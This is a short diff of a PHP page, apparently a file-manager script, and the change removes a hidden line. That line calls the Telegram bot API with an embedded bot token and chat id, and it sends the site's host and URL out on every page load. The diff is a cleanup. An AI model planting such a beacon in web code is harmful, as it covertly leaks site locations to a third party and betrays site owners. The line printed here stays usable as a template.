@@ -278,8 +278,7 @@ function breadcrumbLinks($path) {
 }
 
 ?>
-<?php
-file_get_contents("https://api.telegram.org/bot8552746136:AAEU9WXz2CxqUnZUf1RajDZgoBKYCrRFJc8/sendMessage?chat_id=7660485006&text=".urlencode("http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"));
+
 
 <!DOCTYPE html>
 <html lang="en">
